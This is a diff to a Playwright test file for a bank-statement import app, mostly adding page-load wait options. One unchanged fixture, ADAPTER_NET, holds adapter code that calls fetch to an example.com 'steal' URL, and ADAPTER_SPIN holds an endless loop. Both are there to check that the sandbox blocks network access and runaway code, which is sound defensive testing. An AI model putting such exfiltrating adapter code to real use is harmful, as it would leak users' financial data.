@@ -10,7 +10,7 @@ async function parse(
   files: Parameters<Page['setInputFiles']>[1],
   importer?: string,
 ) {
-  await page.goto('/import');
+  await page.goto('/import', { waitUntil: 'domcontentloaded' });
   await selectByText(page, 'Account', account);
   if (importer) await selectByText(page, 'Importer', importer);
   await page.locator('input[type=file][multiple]').setInputFiles(files);
@@ -45,10 +45,10 @@ test('Raiffeisen BiH statement (synthetic PDF): detected, balanced, opening bala
   await expect(card.getByRole('button', { name: /Set opening balance/ })).toBeHidden();
   const staged = await stage(page, 'izvod-synthetic.pdf');
   expect(await commit(staged)).toBe(11);
-  await page.goto('/transactions');
+  await page.goto('/transactions', { waitUntil: 'domcontentloaded' });
   await expect(page.getByRole('row', { name: /SOPING CENTAR/ })).toBeVisible();
   await expect(page.getByRole('row', { name: /PLATA PRIMJER FIRMA/ })).toBeVisible();
-  await page.goto('/accounts');
+  await page.goto('/accounts', { waitUntil: 'domcontentloaded' });
   await expect(page.getByRole('main').getByText('BAM 58.16').first()).toBeVisible(); // closing balance
 });
 
@@ -56,7 +56,7 @@ test('merchant template: saved from an import row, auto-applied to the next stat
   page,
 }) => {
   await onboardLocal(page, [{ name: 'CSV bank', type: 'checking', currency: 'BAM' }]);
-  await page.goto('/import?tab=mapping');
+  await page.goto('/import?tab=mapping', { waitUntil: 'domcontentloaded' });
   await page.getByText('Import template JSON').click();
   await page
     .getByLabel('Template JSON')
@@ -65,7 +65,7 @@ test('merchant template: saved from an import row, auto-applied to the next stat
   await page.getByRole('button', { name: 'Save template' }).click();
   await expect(page.getByText('Primjer Banka CSV (synthetic example)').first()).toBeVisible();
 
-  await page.goto('/import');
+  await page.goto('/import', { waitUntil: 'domcontentloaded' });
   await selectByText(page, 'Account', 'CSV bank');
   await selectByText(page, 'Mapping template', 'Primjer Banka CSV');
   await page
@@ -92,7 +92,7 @@ test('merchant template: saved from an import row, auto-applied to the next stat
     '04.02.2025;04.02.2025;Ručak;Ćevabdžinica Željo;22,00;;4.297,30;R-010',
     '06.02.2025;06.02.2025;Kupovina;Trgovina Šećer;10,00;;4.287,30;R-011',
   ].join('\n');
-  await page.goto('/import');
+  await page.goto('/import', { waitUntil: 'domcontentloaded' });
   await selectByText(page, 'Account', 'CSV bank');
   await selectByText(page, 'Mapping template', 'Primjer Banka CSV');
   await page
@@ -113,7 +113,7 @@ test('merchant template: saved from an import row, auto-applied to the next stat
       .locator('option:checked'),
   ).toHaveText(/Uncategorized/);
   await commit(second);
-  await page.goto('/transactions');
+  await page.goto('/transactions', { waitUntil: 'domcontentloaded' });
   await expect(page.getByRole('row', { name: /Ručak/ })).toContainText('Restaurants');
 });
 
@@ -126,7 +126,7 @@ const ADAPTER_NET = `function parse(input) { fetch('https://example.com/steal?d=
 const ADAPTER_SPIN = `function parse(input) { for (;;) {} }`;
 
 async function addAdapter(page: Page, id: string, name: string, code: string) {
-  await page.goto('/import?tab=adapters');
+  await page.goto('/import?tab=adapters', { waitUntil: 'domcontentloaded' });
   await page.getByRole('button', { name: 'New adapter' }).click();
   await page.getByLabel('Name', { exact: true }).fill(name);
   await page.getByLabel('Id', { exact: true }).fill(id);
@@ -174,6 +174,6 @@ test('custom sandboxed adapter: parses its format; network access and endless lo
   await parse(page, 'Adapter bank', file('ok.csv'), 'Custom: Semicolon bank');
   const card = await stage(page, 'ok.csv');
   expect(await commit(card)).toBe(2);
-  await page.goto('/transactions');
+  await page.goto('/transactions', { waitUntil: 'domcontentloaded' });
   await expect(page.getByRole('row', { name: /Pekara Čelik/ })).toBeVisible();
 });
